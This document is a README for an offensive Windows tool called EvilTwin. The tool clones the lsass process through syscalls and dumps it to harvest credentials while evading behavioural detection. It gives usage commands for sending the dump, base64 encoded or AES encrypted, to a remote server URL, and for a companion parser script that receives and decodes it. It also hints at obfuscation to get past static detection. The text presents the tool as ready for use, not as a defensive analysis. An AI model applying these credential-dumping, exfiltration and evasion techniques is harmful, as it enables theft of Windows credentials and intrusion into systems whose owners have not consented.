# EvilTwin
```
EvilTwin.exe -h

run without any args: clones and dumps lsass and saves it to current dir

-send            a url to send base64 encoded lsass dmp to

-send-encrypted  sends lsass to the url above but AES encrypted not just b64 encoded
```

EvilTwin is a tool inspired by:
  - Guilherme Carneiro's post on cloning and encrypting lsass: https://www.linkedin.com/feed/update/urn:li:activity:7117555527538073600/
  - Safety Dump: https://github.com/riskydissonance/SafetyDump (not just inspired, MiniDumpWriteDump callbacks are stolen from here XD)

the idea is to get around detection mechanisms by cloning lsass's memory address space to the current with the legacy api NtCreateProcessEx and dump the current process memory
that contains the cloned lsass

## API Calls ##

- all api calls (except MiniDumpWriteDump) happens through syscalls
- MiniDumpWriteDump is dynamically imported from a mapped version of (dbgcore.dll), BUT NtReadVirtualMemory() is still visible
  - *NtReadVirtualMemory is the underlying call of MiniDumpWriteDump*
  - we dump our own process, that shouldn't be a problem
 
## options ##

EvilTwin supports 3 options

- running without any arguments, will dump and encrypt lsass and write encrypted lsass to the current directory
- running with `-send http://server.com/` will dump, base64 encode and send lsass to said server, use `python3 EvilTwinParser.py receive` to recieve and parse lsass on the fly
- running with `-send-encrypted http://server.com/` will dump and encrypt lsass and send it to said server, use `python3 EvilTwinParser.py save` to recieve and save lsass

- *AES Encryption happens with randomly generated KEY and IV everytime, they are printed on the screen if encryption is used (don't clear the screen so fast)*

## AES decryption and parsing ## 

EvilTwinParser.py supports multiple ways of receiving the resulting dump mentioned above, also the script AES decrypts an encrypted dmp as follows
- `python3 EvilTwinParser.py decrypt -file <lsass.dmp> -key <AES_KEY> -iv <AES_IV>`

```
usage: EvilTwinParser.py [-h] [-key KEY] [-iv IV] [-file FILE] {receive,decrypt,save}

positional arguments:
  {receive,decrypt,save}
                        receive b64 lsass and parse it OR decrypt/decode and parse an AES encrypted dmp OR just save the AES encrypted dmp to disk

options:
  -h, --help            show this help message and exit
  -key KEY              use only with (decrypt) argument
  -iv IV                use only with (decrypt) argument
  -file FILE            use only with (decrypt) argument
```


## Note ##

- when compiled out of the box it has static detection of SafetyDump (obviously), but no behavioural detection (the goal)
  - simple obfuscation was enough to get it behind everything but that is left as an exercise for the reader (for an obvious reason XD)  
